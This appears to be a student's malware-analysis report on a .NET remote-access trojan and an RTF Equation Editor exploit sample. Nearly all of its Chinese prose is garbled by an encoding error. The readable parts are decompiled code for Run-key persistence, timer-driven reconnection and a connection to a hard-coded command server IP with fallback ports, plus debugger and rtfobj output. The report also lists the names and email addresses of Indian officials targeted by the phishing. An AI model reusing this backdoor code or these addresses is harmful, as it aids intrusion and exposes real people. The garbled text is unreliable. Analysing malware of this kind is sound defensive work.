1. æ ¹æ“šAny.Runçš„ATT&CK Matrixä»¥åŠæˆ‘è‡ªå·±åˆ†æçš„çµæœï¼Œçœ‹åˆ°ä»–ä½¿ç”¨timeré€™å€‹æ–¹å¼ç•¶ä½œpersistençš„æ‰‹æ³•ï¼Œç•¶do_start() methodå•Ÿå‹•ä¹‹å¾Œï¼Œéš”ä¸€æ®µæ™‚é–“å°±æœƒè§¸ç™¼é€£ç·šï¼Œä¸¦ä¸”æ¯éš”ä¸€æ®µæ™‚é–“å°±æœƒé‡æ–°æª¢æŸ¥connection(é›–ç„¶Any.Runæ²’æœ‰çœ‹å‡ºä¾†)ï¼Œæ‰€ä»¥æˆ‘çŒœé€™å€‹æ‰‹æ³•å°æ‡‰çš„[ATT&CK IDæ‡‰è©²æ˜¯T1053.006](https://attack.mitre.org/techniques/T1053/006/)
    ```csharp
    public void dlrarhsivado_start()
    {
        DLAONIF.dlrarhsivaport = DLAONIF.ports[0];
        this.dlrarhsivaUPC = new MLRLEINF();
        this.dlrarhsivaCMD = new OLRDMR(this);
        this.dlrarhsivaHD.iserver = this;
        this.dlrarhsivaHD.dlrarhsivamainPath = DLAONIF.dlrarhsivaget_mpath();
        TimerCallback callback = new TimerCallback(this.dlrarhsivalookup_connect);
        System.Threading.Timer dlrarhsivatimer = new System.Threading.Timer(callback, this.dlrarhsivaStateObj, 31280, 37420);
        this.dlrarhsivaStateObj.dlrarhsivatimer = dlrarhsivatimer;
    }
    ```
2. å¦å¤–ï¼Œç„¡æ„é–“ç”¨Autorunç™¼ç¾ä»–æœ‰æŠŠ`Hdlharas\dlrarhsiva.exe`è¨»å†Šåˆ°registryä¸­ï¼Œé€™ä¹Ÿæ˜¯å¸¸è¦‹çš„å¥—è·¯ï¼Œä»¥ATT&CKçš„frameworkä¾†èªªï¼Œæ‡‰è©²æ˜¯[T1547.001](https://attack.mitre.org/techniques/T1547/001/)(Any.Runé‚„æ˜¯æ²’æœ‰çœ‹å‡ºä¾†)ï¼Œè©³ç´°çš„codeå¦‚ä¸‹
    ![åœ–ç‰‡](https://hackmd.io/_uploads/rygmHumT6.png)
    ```csharp
    public static void dlrarhsivaset_run(string app, string path)
    {
        try
        {
            string name = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run|dlrarhsiva".Split(new char[]
            {
                '|'
            })[0];
            RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name, true);
            string str = DLAONIF.dlrarhsivapc_id;
            object value = registryKey.GetValue(str + app);
            if (value == null)
            {
                registryKey.SetValue(str + app, path);
            }
            else if (value.ToString() != path)
            {
                registryKey.SetValue(str + app, path);
            }
        }
        catch
        {
        }
    }
    ```
    é€™æ˜¯åœ¨`DLAONIF`é€™å€‹moduleä¸­ï¼Œä¸»è¦æœƒç”±`MLREDM/dlrarhsivaload_app`é€™å€‹methodå‘¼å«åˆ°ï¼Œå°æ‡‰å€’çš„æŒ‡ä»¤æ˜¯==dlrarhsiva-putsrt==
    ![åœ–ç‰‡](https://hackmd.io/_uploads/SJqMqdXa6.png)

## ä¸­ç¹¼ç«™

### åŸºæœ¬è³‡è¨Š
åœ¨å‰é¢æåˆ°çš„å¾Œé–€åŠŸèƒ½ä¸­æœ‰ä¸€å€‹æ˜¯å°ˆé–€è™•ç†ç¶²è·¯é€£ç·šçš„(`dlrarhsivaIPSConfig`)ï¼Œé€™å…¶å¯¦è »æœ‰è¶£çš„ï¼Œä»–ä¸ç›´æ¥å¯«å‡ºé€£ç·šçš„IPï¼Œåè€Œæ˜¯åšäº†ç°¡å–®çš„asciiè½‰æ›å¾Œæ‰é€²è¡Œé€£ç·šï¼Œå¦‚ä¸‹æ‰€ç¤º
1. MLREDM/dlrarhsivaIPSConfig()
    é€™ä¸€æ®µä¸»è¦æ˜¯é€²è¡Œé€£ç·šï¼Œä½†æ˜¯åœ¨é€£ç·šå‰æœƒé€²è¡ŒIP parsingå’Œfetching portçš„å‹•ä½œ(å¦‚ä¸‹ä¸€æ®µæ‰€ç¤º)
    ```csharp
    // dlrarhsiva.MLREDM
    // Token: 0x0600001A RID: 26 RVA: 0x0000365C File Offset: 0x0000185C
    private bool dlrarhsivaIPSConfig()
    {
        bool result;
        try
        {
            DLAONIF.dlrarhsivadefaultP = this.dlrarhsivaCMD.dlrarhsivaserverIPD();
            this.dlrarhsivatcpsck = new TcpClient();
            this.dlrarhsivatcpsck.Connect(DLAONIF.dlrarhsivadefaultP, DLAONIF.dlrarhsivaport);
            result = true;
        }
        catch
        {
            this.dlrarhsivaports_switch();
            result = false;
        }
        return result;
    }
    ```
2. OLRDMR/dlrarhsivaserverIPD()
    é€™ä¸€æ®µå°±æ˜¯æŠŠDLAONIF.dlrarhsivavpsipsè½‰æ›æˆUTF-8è€Œå·²ï¼ŒåŸæœ¬æ˜¯asciiçš„integerå½¢å¼ï¼Œè½‰æ›å¾Œå°±è®Šæˆä¸€èˆ¬çš„ascii stringï¼Œä¹Ÿå°±æ˜¯==185.136.161.124==
    ```csharp
    using System;
    using System.Diagnostics;
    using System.IO;
    using System.Net.Sockets;
    using System.Text;

    namespace dlrarhsiva
    {
        // Token: 0x02000009 RID: 9
        internal class OLRDMR
        {
            ...
            public string dlrarhsivaserverIPD()
            {
                return Encoding.UTF8.GetString(DLAONIF.dlrarhsivavpsips, 0, DLAONIF.dlrarhsivavpsips.Length);
            }
            ...
            // Token: 0x0400003A RID: 58
            public MLREDM server;
        }
    }
    ```
3. DLAONIF/
    ä¹Ÿå¯ä»¥è‡ªè¡Œè½‰æ›ä¸‹é¢çš„IPï¼Œå¦å¤–ä»–æœ‰å¥½å¹¾å€‹Portï¼Œè©³ç´°çš„codeå¯ä»¥åƒè€ƒMLREDM/dlrarhsivaports_switch()é€™å€‹methodï¼Œåœ¨default port 6128é€£ä¸ä¸Šå»çš„æ™‚å€™å¯ä»¥è‡ªè¡Œåˆ‡æ›é å…ˆè¨­å®šå¥½çš„port number
    ```csharp
    using System;
    using System.IO;
    using System.Windows.Forms;
    using Microsoft.Win32;

    namespace dlrarhsiva
    {
        // Token: 0x02000002 RID: 2
        internal static class DLAONIF
        {
            ...
            public static int[] ports = new int[]
            {
                6128,
                8761,
                11614,
                15822,
                17443
            };

            // Token: 0x04000005 RID: 5
            public static byte[] dlrarhsivavpsips = new byte[]
            {
                49,
                56,
                53,
                46,
                49,
                51,
                54,
                46,
                49,
                54,
                49,
                46,
                49,
                50,
                52
            };

            // Token: 0x0400000A RID: 10
            public static string dlrarhsivaAppPath = "";
        }
    }
    ```

### é—œé€£è³‡è¨Š
æˆ‘ä¸æ˜¯å¾ˆç¢ºå®šé—œè¯è³‡è¨Šæƒ³è¦çš„å½¢å¼æ˜¯ä»€éº¼ï¼Œæ‰€ä»¥æˆ‘é¸æ“‡åƒè€ƒ[whoisçš„çµæœ](https://ipwhoisinfo.com/ip/185.136.161.124)å’Œ[VirusTotalçš„çµæœ](https://www.virustotal.com/gui/file/0335de8eadbbd5dc7cbe92ef869bcea6f6596ac39a38680142c982ec6e97ecde/behavior)äº’ç›¸å°ç…§ï¼Œé€™å€‹IPæ˜¯ä¾†è‡ªæ–¼æ³•åœ‹çš„Strasbourgï¼Œæ˜¯åœ¨å¾·åœ‹èˆ‡æ³•åœ‹è¶…é‚Šç•Œçš„åœ°æ–¹

## å¨è„…æƒ…è³‡

### æ”»æ“Šè€…
`Duty Staff Officer <ram.ratan909@navy.gov.in>`ï¼Œæˆ‘åœ¨OSINTçš„å„å€‹online tooléƒ½æ²’æœ‰æ‰¾åˆ°ç›¸é—œçš„è³‡è¨Šï¼Œè€Œä¸”æœ‰äº›ç”šè‡³é‚„èªªé€™æ˜¯validï¼Œæƒ³ä¸€æƒ³ä¹Ÿå°ï¼Œé€™å€‹mailçš„formatçœ‹èµ·ä¾†æ˜¯å±¬æ–¼æ”¿åºœå–®ä½ï¼Œæ‰€ä»¥æˆ‘çŒœå¯èƒ½æ˜¯æ”¿åºœå–®ä½çš„æŸå€‹AD accountè¢«æ‹¿ä¸‹ä¾†ï¼Œç„¶å¾Œå°±ç™¼é€é€™æ¨£çš„è¨Šæ¯å‡ºå»ï¼ŒæˆåŠŸç‡çœ‹èµ·ä¾†ä¹Ÿæœƒæ¯”è¼ƒé«˜
:::danger
æ­£ç¢ºç­”æ¡ˆæ˜¯æ”»æ“Šè€…å¯ä»¥ç¯¡æ”¹mailæ–‡ä»¶ä¸­çš„å¯„é€äººå’Œrouterè³‡è¨Šï¼Œæ‰€ä»¥è¦å¯¦éš›å»è£¡é¢çœ‹å¯„é€çš„IPï¼Œæœ‰å¯èƒ½é€™å€‹å°±æ˜¯è©²æ”»æ“Šè€…çš„C2 Serverï¼Œæ‰€ä»¥å…¶å¯¦æ”»æ“Šè€…æ²’æœ‰æŠŠAD accountæ‹¿ä¸‹ä¾†
:::

### æ”»æ“Šæ™‚é–“
`Tue, 28 Apr 2020 10:50:41 +0530 (IST)`

### å—å®³è€…
å¾éƒµä»¶ä¸­çš„CC Userä¾†çœ‹ï¼Œ"å¯èƒ½"çš„å—å®³è€…æœ‰ä»¥ä¸‹å¹¾å€‹
```
"Wg Cdr MA  JAFFER ALI" <jdwcdma@iaf.nic.in>
"Wg Cdr PAWAN BENIWAL" <wanwal.26965@gov.in>
"Wg Cdr Kundan Kumar"<challenger@nic.in>
"Wing Commander Raji kurian" <yatch.master@gov.in>
"SLO 54 ASP" <teacher_town@nic.in>
"Gp Capt Atul Kumar Arora" <moon.light@gov.in>
"Flt Lt Richa Bansal" <mtl.amer@nic.in>
```

---
# æ¨£æœ¬(5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9)

## æƒ¡æ„ç¨‹å¼

### æª”æ¡ˆè³‡è¨Š
1. DIE(Detect It Easy)
    ![åœ–ç‰‡](https://hackmd.io/_uploads/BygTPpT2T.png)
    å¾DIEä¾†çœ‹ä¸¦æ²’æœ‰ä»€éº¼ç‰¹åˆ¥çš„packeræˆ–æ˜¯linkerï¼Œåè€Œå‡ºç¾RTFæ ¼å¼ï¼Œä¸€é–‹å§‹ä¸çŸ¥é“é€™æ˜¯ä»€éº¼ï¼Œä½†æ ¹æ“š[^rtf]çš„èªªæ˜ï¼Œæ‡‰è©²å¯ä»¥ç†è§£æˆæ¯”è¼ƒå»£æ³›æ€§çš„Wordæ–‡å­—æª”æ¡ˆ
    > å¯Œæ–‡æœ¬æ ¼å¼ï¼ˆRich Text Format, ä¸€èˆ¬ç°¡ç¨±ç‚ºRTFï¼‰æ˜¯ç”±å¾®è»Ÿå…¬å¸é–‹ç™¼çš„è·¨å¹³å°æ–‡æª”æ ¼å¼ã€‚å¤§å¤šæ•¸çš„æ–‡å­—è™•ç†è»Ÿé«”éƒ½èƒ½è®€å–å’Œä¿å­˜RTFæ–‡æª”ã€‚RTFæ˜¯Rich TextFormatçš„ç¸®å¯«ï¼Œæ„å³å¤šæ–‡æœ¬æ ¼å¼ã€‚é€™æ˜¯ä¸€ç¨®é¡ä¼¼DOCæ ¼å¼ï¼ˆWordæ–‡æª”ï¼‰çš„æª”æ¡ˆï¼Œæœ‰å¾ˆå¥½çš„å…¼å®¹æ€§ï¼Œä½¿ç”¨Windowsâ€œé™„å±¬æª”æ¡ˆâ€ä¸­çš„â€œå¯«å­—æ¿â€å°±èƒ½æ‰“é–‹ä¸¦é€²è¡Œç·¨è¼¯ã€‚RTFæ˜¯ä¸€ç¨®éå¸¸æµè¡Œçš„æª”æ¡ˆçµæ§‹ï¼Œå¾ˆå¤šæ–‡å­—ç·¨è¼¯å™¨éƒ½æ”¯æŒå®ƒã€‚ä¸€èˆ¬çš„æ ¼å¼è¨­å®šï¼Œæ¯”å¦‚å­—å‹å’Œæ®µè½è¨­å®šï¼Œé é¢è¨­å®šç­‰ç­‰ä¿¡æ¯éƒ½å¯ä»¥å­˜åœ¨RTFæ ¼å¼ä¸­ï¼Œå®ƒèƒ½åœ¨ä¸€å®šç¨‹åº¦ä¸Šå¯¦ç¾wordèˆ‡wpsæª”æ¡ˆä¹‹é–“çš„äº’è¨ªã€‚
2. File/Stat/Exiftool
    å¾ä»¥ä¸‹çš„çµæœä¾†çœ‹ï¼Œé€™å€‹æª”æ¡ˆçš„ç¢ºæ˜¯RTFæ ¼å¼ä¸”Created Timeæ˜¯åœ¨2019å¹´
    :::spoiler Command Result
    ```bash
    $ file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
    5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9: Rich Text Format data, version 1, ANSI, code page 936, default middle east language ID 1025
    $ exiftool 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
    ExifTool Version Number         : 12.40
    File Name                       : 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
    Directory                       : .
    File Size                       : 217 KiB
    File Modification Date/Time     : 2023:08:14 11:54:52+08:00
    File Access Date/Time           : 2024:02:29 16:55:48+08:00
    File Inode Change Date/Time     : 2024:02:29 16:55:48+08:00
    File Permissions                : -rwxrwxrwx
    File Type                       : RTF
    File Type Extension             : rtf
    MIME Type                       : text/rtf
    Warning                         : Unsupported RTF encoding cp936. Will assume Latin.
    Last Modified By                : Koby
    Create Date                     : 2019:12:24 10:28:00
    Modify Date                     : 2019:12:24 10:28:00
    Revision Number                 : 2
    Total Edit Time                 : 0
    Pages                           : 1
    Words                           : 252
    Characters                      : 1441
    Characters With Spaces          : 1690
    Internal Version Number         : 117
    $ stat 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
      File: 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9
      Size: 222012          Blocks: 440        IO Block: 4096   regular file
    Device: 66h/102d        Inode: 2814749767539972  Links: 1
    Access: (0777/-rwxrwxrwx)  Uid: ( 1000/ sbk6401)   Gid: ( 1000/ sbk6401)
    Access: 2024-02-29 16:55:48.947690500 +0800
    Modify: 2023-08-14 11:54:52.000000000 +0800
    Change: 2024-02-29 16:55:48.947690500 +0800
     Birth: -
    ```
    :::
3. é€™ä¸€é¡Œåœ¨æ²’æœ‰çœ‹VirusTotalæˆ–æ˜¯Any.Runçš„æƒ…æ³ä¹‹ä¸‹ï¼Œæˆ‘åœ¨local VMå…§çœŸçš„çœ‹ä¸å‡ºä¾†æœ‰ä»€éº¼å•é¡Œï¼Œå¾Œä¾†å¿ä¸ä½ä¸Šç¶²çœ‹ä¸€ä¸‹ç›¸é—œçš„hashï¼Œç™¼ç¾ä»–æ˜¯ä½¿ç”¨==CVE-2017-11882==é€™å€‹ç”±Microsoftæå‡ºçš„æ¼æ´é–‹ç™¼å‡ºä¾†çš„malware file[^virustotla-cve-2017-11882]ï¼Œè€Œæ¯”è¼ƒæ–°çš„ç‰ˆæœ¬å¤§éƒ¨åˆ†éƒ½å·²ç¶“è¢«patchäº†ï¼Œæ‰€ä»¥æˆ‘åœ¨VMå…§æ‰æœƒæ‰¾ä¸å‡ºç›¸é—œçš„æ”»æ“Šç—•è·¡(æµªè²»äº†å¾ˆå¤šæ™‚é–“)
    ![è¢å¹•æ“·å–ç•«é¢ 2024-03-05 135304](https://hackmd.io/_uploads/HkR0X4V66.png)
    å¾ä¸Šåœ–ä¾†çœ‹ï¼Œæ²’æœ‰çœ‹åˆ°ä»»ä½•åŸ·è¡ŒEQNEDT32.EXEçš„processï¼Œç‚ºäº†èƒ½å¤ åœ¨localç«¯å¯¦éš›çœ‹åˆ°æ”»æ“Šçš„è»Œè·¡ï¼Œæˆ‘å¾å­¸æ ¡çš„æˆæ¬Šè»Ÿé«”ç¶²ç«™ä¸­ä¸‹è¼‰äº†Office 2016(åŸæœ¬æ˜¯2021)ï¼Œæ‰ç™¼ç¾ç›¸é—œçš„patché‚„æ²’æ™®åŠåˆ°é€™å€‹ç‰ˆæœ¬(æ˜¯ä¸æ˜¯è¦é€šå ±ä¸€ä¸‹è¨ˆä¸­å‘¢??ğŸ¤”)
    ![image](https://hackmd.io/_uploads/H1NNEE4p6.png)
    :::danger
    é€™å€‹CVEæ˜¯éŒ¯çš„ï¼Œå’ŒEQNEDT32.EXEæœ‰é—œçš„CVEæœ‰ä¸‰å€‹:
    CVE-2017-11882
    CVE-2018-0802
    CVE-2018-0798
    æ‰€ä»¥å…¶å¯¦ä¸æ˜¯ç›®å‰çš„é€™ä¸€å€‹ï¼Œé€™ä¹Ÿè­‰æ˜äº†æˆ‘æ‰¾è¶…ä¹…éƒ½æ²’æœ‰æ‰¾åˆ°çš„EQNEDT32.EXEçš„æ´æ˜¯å“ªè£¡
    :::

### åŸ·è¡Œæµç¨‹
:::info
å› ç‚ºé€™ä¸€é¡Œæˆ‘æ˜¯åœ¨å·²çŸ¥æ¼æ´CVEçš„å‰æä¸‹é€²è¡Œåˆ†æï¼Œæ‰€ä»¥æˆ‘æœƒå…ˆå‡è£åœ¨ä¸çŸ¥é“çš„æƒ…æ³ä¸‹ï¼Œæ•˜è¿°æˆ‘å¯èƒ½æœƒå¦‚ä½•åˆ†æï¼Œå¦‚æœé€”ä¸­æœ‰æŸå€‹åœ°æ–¹æ˜¯æˆ‘ä¸çŸ¥é“å¦‚ä½•ç¹¼çºŒé€²è¡Œæˆ–æ˜¯æŸå€‹background knowledgeæˆ‘ä¸€å®šå…ˆçŸ¥é“ï¼Œæˆ‘æœƒæ¨™è¨»å…¶ä¸­
:::
:::danger
å› ç‚ºä¸èƒ½ä½¿ç”¨ç·šä¸Šsandbox toolsï¼Œæ‰€ä»¥å…¶å¯¦æ‡‰è©²è¦æœ‰command senseæ˜¯ç›´æ¥ä½¿ç”¨RTFOBJé€²è¡ŒParsingï¼Œä¸¦ä¸”é‡å°Embeddedçš„Fileå»OSINTä»–å°±å¯èƒ½å¯ä»¥ä¸éœ€è¦é€éAnyRunçŸ¥é“ä»–æ˜¯å“ªä¸€å€‹CVEé€ æˆçš„æƒ¡æ„æ¨£æœ¬
:::
1. Process Monitor
    åœ¨åŸ·è¡Œä¸€å€‹å¯ç–‘çš„fileæ™‚ï¼Œæˆ‘æœƒå˜—è©¦å…ˆç”¨process monitorä»¥åŠwiresharkéŒ„è£½å…¶ä¸­ç›¡å¯èƒ½è©³ç´°çš„æ‰€æœ‰éç¨‹(ç•¶ç„¶å¯¦è¡Œå‰ä¸€å®šè¦å…ˆsnapshot)ï¼Œç„¶å¾Œçœ‹ä¸€ä¸‹ä¸­é–“çš„éç¨‹æœ‰ç„¡è§¸åŠåˆ°CreateFileã€WriteFiileä»¥åŠregistryé€™æ¨£çš„æ“ä½œ
    ç‚ºäº†è¦æ›´æº–ç¢ºçš„filterä¸å¿…è¦çš„ç´€éŒ„ï¼Œæˆ‘è¨­å®šçš„æ¢ä»¶æ˜¯:
    1. Operation is WriteFile then Include
    2. Process Name is Wireshark.exe then Exclude
    3. Process Name is dumpcap.exe then Exclude
    ![image](https://hackmd.io/_uploads/SJBQ2N4p6.png)
    æ¥è‘—æˆ‘å°±ç™¼ç¾æœ‰ä¸€å€‹==EQNEDT32.exe==çš„processå¯«äº†ä¸€å€‹intel.wllçš„æª”æ¡ˆåˆ°`C:\Users\REM\AppData\Roaming\Microsoft\Word\STARTUP\intel.wll`
    ![image](https://hackmd.io/_uploads/HJF9n44p6.png)
    ç•¶ç„¶é€™ä¹Ÿè¦æœ‰è¶³å¤ çš„ç¶“é©—æ‰æœ‰è¾¦æ³•æ›´æº–ç¢ºçš„çŒœæ¸¬é€™æ˜¯ä¸€å€‹å¯èƒ½æœ‰å•é¡Œçš„æ“ä½œï¼Œæ‰€ä»¥é€™ä¸€å€‹processæœ‰ä¸€éƒ¨åˆ†æ˜¯åƒè€ƒç¶²è·¯ä¸ŠCVEçš„èªªæ˜æ‰æ›´ç¢ºå®šé€™å€‹æ–¹å‘æ˜¯å°çš„
2. Analyze EQNEDT32.exe
    ç‚ºäº†æ›´é€²ä¸€æ­¥çŸ¥é“æˆ‘çš„æƒ³æ³•æ˜¯å¦æ­£ç¢ºï¼Œæ‰€ä»¥æˆ‘ä¿®æ”¹äº†æˆ‘çš„filter ruleâ†’
    1. Process Name is EQNEDT32.exe then Include
    2. Process Name is Wireshark.exe then Exclude
    3. Process Name is dumpcap.exe then Exclude
    
    ç™¼ç¾æœ‰å¾ˆå¤šä¸åŒçš„processéƒ½æœ‰BoFçš„å•é¡Œ
    ![image](https://hackmd.io/_uploads/SkNnCEN6a.png)
    è€Œç›´åˆ°æ¯”è¼ƒå¾Œç«¯çš„æ“ä½œæ‰å‡ºç¾CreateFileã€WriteFileã€CloseFileçš„æ“ä½œï¼Œä¸»è¦æ˜¯
    `C:\Users\REM\AppData\Roaming\Microsoft\Word\STARTUP\intel.wll`å’Œ`C:\Users\REM\AppData\Local\Temp\8.t`
    ![image](https://hackmd.io/_uploads/rkPe1HVa6.png)
3. æ‰€ä»¥ï¼Œåˆ°ç›®å‰ç‚ºæ­¢å¯ä»¥å¾ˆç¢ºå®šçš„äº‹æƒ…æ˜¯é€™å€‹RTF Fileï¼Œè£¡é¢é‹è—äº†ä¸€äº›æª”æ¡ˆï¼Œæ‰€ä»¥æˆ‘æ‰“ç®—é‡å°é€™å€‹fileé€²è¡Œéœæ…‹çš„åˆ†æï¼Œä½†æ˜¯æˆ‘ç•¶ç„¶çœ‹ä¸æ‡‚officeé‡å°RTFçš„èªæ³•å’Œçµæ§‹ç‚ºä½•ï¼Œæ‰€ä»¥æ ¹æ“š[^rtf-wp1]çš„èªªæ˜æåˆ°å¯ä»¥ç”¨[RTFOBJ](https://github.com/decalage2/oletools)é€™å€‹toolï¼Œå¹«å¿™parseå…¶ä¸­çš„å…§å®¹ï¼Œçµæœå¦‚ä¸‹
    ```bash
    $ rtfobj -s all 5bbf2643a601e632a49406483c8f
    c5262a76e206bd969f2ba3f4f2e238768ab9
    rtfobj 0.60.1 on Python 3.8.17 - http://decalage.info/python/oletools
    THIS IS WORK IN PROGRESS - Check updates regularly!
    Please report any issue at https://github.com/decalage2/oletools/issues

    ===============================================================================
    File: '5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9' - size: 222012 bytes
    ---+----------+---------------------------------------------------------------
    id |index     |OLE Object
    ---+----------+---------------------------------------------------------------
    0  |0000E970h |format_id: 2 (Embedded)
       |          |class name: b'Package'
       |          |data size: 73928
       |          |OLE Package object:
       |          |Filename: '8.t'
       |          |Source path: 'C:\\Aaa\\tmp\\8.t'
       |          |Temp path = 'C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\8.t'
       |          |MD5 = '8eac8203cf56f2b24753986353deac7e'
       |          |File Type: Unknown file type
    ---+----------+---------------------------------------------------------------
    1  |00032B90h |format_id: 2 (Embedded)
       |          |class name: b'Equation.2\x00\x124Vx\x90\x124VxvT2'
       |          |data size: 6436
       |          |MD5 = 'a09e82c26f94f3a9297377120503a678'
    ---+----------+---------------------------------------------------------------
    2  |00032B76h |Not a well-formed OLE object
    ---+----------+---------------------------------------------------------------
    Saving file from OLE Package in object #0:
      Filename = '8.t'
      Source path = 'C:\\Aaa\\tmp\\8.t'
      Temp path = 'C:\\Users\\ADMINI~1\\AppData\\Local\\Temp\\8.t'
      saving to file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_8.t
      md5 8eac8203cf56f2b24753986353deac7e
    Saving file embedded in OLE object #1:
      format_id  = 2
      class name = b'Equation.2\x00\x124Vx\x90\x124VxvT2'
      data size  = 6436
      saving to file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_object_00032B90.bin
      md5 a09e82c26f94f3a9297377120503a678
    Saving raw data in object #2:
      saving object to file 5bbf2643a601e632a49406483c8fc5262a76e206bd969f2ba3f4f2e238768ab9_object_00032B76.raw
      md5 a3540560cf9b92c3bc4aa0ed52767b8a
    ```
    æˆ‘ç™¼ç¾å…¶å¯¦å…§è—çš„æª”æ¡ˆå…¶å¯¦æ˜¯`8.t`
4. Analyze RTF Malware File
    æˆ‘æƒ³è¦è·Ÿä¸€ä¸‹é€™å€‹RTFå› ç‚ºstack overflowçš„å•é¡Œåˆ°åº•æ˜¯æ€éº¼è®ŠæˆRCEçš„ï¼Œæ‰€ä»¥æˆ‘å…ˆç”¨Proess MonitorçŸ¥é“ä»–æœƒcallåˆ°CreateFileé€™å€‹APIï¼Œå› æ­¤æˆ‘å…ˆç”¨x32dbg attach eqnedt32.exeé€™å€‹fileï¼Œç„¶å¾Œè¨­å®šbreakpointåˆ°kernelbase.dllä¸­çš„CreateFileAé€™å€‹API
    ![åœ–ç‰‡](https://hackmd.io/_uploads/r12X9ZUpa.png)
    æ¥è‘—æˆ‘ç›´æ¥å•Ÿå‹•malware fileï¼Œdbgæœƒåœåœ¨CreateFileä¸Šï¼Œæ­¤æ™‚æˆ‘å›å»çœ‹stackä¸Šçš„return address
    ![åœ–ç‰‡](https://hackmd.io/_uploads/rJzpc-ITp.png)
    ç™¼ç¾ä»–æœƒreturnåˆ°`026A878F`é€™å€‹åœ°æ–¹(æ¯ä¸€æ¬¡åŸ·è¡Œæœƒä¸ä¸€æ¨£ï¼Œæœ‰é»é¡ä¼¼ASLRï¼Œä¸éé€šå¸¸æœƒæŠŠè¦åŸ·è¡Œçš„shellcodeæ”¾åœ¨`26AXXXX`é–‹é ­çš„åœ°æ–¹)ï¼Œé€™å€‹ä½ç½®å­˜çš„æ‡‰è©²å°±æ˜¯ä»–çš„shellcode
    ![åœ–ç‰‡](https://hackmd.io/_uploads/r1v_iWLpT.png)
5. è©³ç´°çš„åˆ†ææ€éº¼åšåˆ°é€™ä¸€æ­¥shellcodeçš„
    é¦–å…ˆï¼Œæˆ‘å·²ç¶“çŸ¥é“ä»–æ˜¯æ€éº¼åˆ©ç”¨stack overflowçš„æ–¹å¼æ”¾ä¸Šshellcodeï¼Œä½†æ˜¯æˆ‘æ‰¾äº†è¶…ä¹…éƒ½é‚„æ˜¯æ²’æœ‰æ‰¾åˆ°2016ç‰ˆæœ¬çš„æ¼æ´åœ¨å“ªè£¡ï¼Œæ‡‰è©²èªªæ ¹æ“š[^rtf-wp2]çš„èªªæ˜ï¼Œæˆ‘çŸ¥é“å› ç‚ºåœ¨è¤‡è£½å­—é«”åç¨±çš„æ™‚å€™ï¼Œæ²’æœ‰æª¢æŸ¥å­—çš„é•·åº¦ï¼Œæ‰€ä»¥å¯ä»¥åˆ©ç”¨é€™ä¸€é»è“‹åˆ°return addressï¼Œä¹Ÿå°±æ˜¯èªªï¼Œå¯ä»¥è®“ç¨‹å¼è·³åˆ°æˆ‘å€‘é å…ˆè¨­å®šå¥½çš„shellcodeä¸Šé¢ï¼Œé‚£ç‚ºä»€éº¼æ‰¾ä¸åˆ°ä»–æª¢æŸ¥é•·åº¦çš„åœ°æ–¹å‘¢?å› ç‚ºæˆ‘çš„åšæ³•æ˜¯åˆ©ç”¨stackä¸Šçš„backtraceå»çœ‹callå®ŒCreateFileä¹‹å¾Œè¦å›åˆ°å“ªè£¡å»åˆ¤æ–·ä»–æ˜¯ä»€éº¼æ™‚å€™ç¯¡æ”¹äº†return addressï¼Œä½†è·Ÿå®Œå‹•æ…‹ç™¼ç¾ä»–ä¼¼ä¹å¾ˆæ—©å°±å·²ç¶“æŠŠshellcodeæ”¾ä¸Šå»äº†(åªæ˜¯ä»€éº¼æ™‚å€™ä¸å¤ªæ¸…æ¥š)ï¼Œæ‰€ä»¥ç¤™æ–¼æ™‚é–“çš„é—œä¿‚ï¼Œæˆ‘å…ˆå¾€ä¸‹åˆ†æï¼Œè©³ç´°çš„æµç¨‹å¦‚ä¸‹:
    ![åœ–ç‰‡](https://hackmd.io/_uploads/H1r90hLap.png)
    åˆ°æœ€å¾Œä»–æœƒåˆ°`0x430BFB`é€™å€‹ä½ç½®ç„¶å¾Œè·³åˆ°`0x268A48C`ï¼Œè«‹æ³¨æ„çœ‹ä¸€ä¸‹åº•ä¸‹ä¸€é»çš„codeç•¶ä¸­æœ‰ä¸€å€‹`jmp 0x268A4BE`ï¼Œé€™å€‹ä¸€è·³éå»å°±æœƒä½¿dbgé‡æ–°ç·¨è­¯éï¼Œé€™ä¹Ÿæ˜¯shellcodeå¾ˆå¸¸ä½¿ç”¨åˆ°çš„æŠ€å·§
    ![åœ–ç‰‡](https://hackmd.io/_uploads/BJaheaI6T.png)
    ![åœ–ç‰‡](https://hackmd.io/_uploads/Sy7BbpLa6.png)
    è‹¥é †è‘—é€™ä¸€æ¢å¾€ä¸‹åŸ·è¡Œï¼Œä»–retçš„åœ°æ–¹å°±æœƒè®Šæˆï¼Œ==0x26A6E8A==(ç•¶ç„¶æ¯ä¸€æ¬¡éƒ½ä¸ä¸€æ¨£ï¼Œå› ç‚ºæ˜¯å‹•æ…‹çš„)
    ![åœ–ç‰‡](https://hackmd.io/_uploads/HJZhZpUap.png)
    
    ---
    * å¾é€™ä¸€æ®µé–‹å§‹å°±æ˜¯æœ‰é—œæ–¼å‘¼å«windows APIçš„éƒ¨åˆ†ï¼Œè€Œä¸”å¯ä»¥çœ‹åˆ°ï¼Œå‰›è·³éå»çš„æ™‚å€™ä¹Ÿæ˜¯ä¸€æ¨£calläº†==0x26A6E8E==ï¼Œè®“çœŸæ­£çš„shellcodeè—åœ¨å…¶ä¸­
    ![åœ–ç‰‡](https://hackmd.io/_uploads/SkDJf6Lpp.png)
    
    * Decrypt
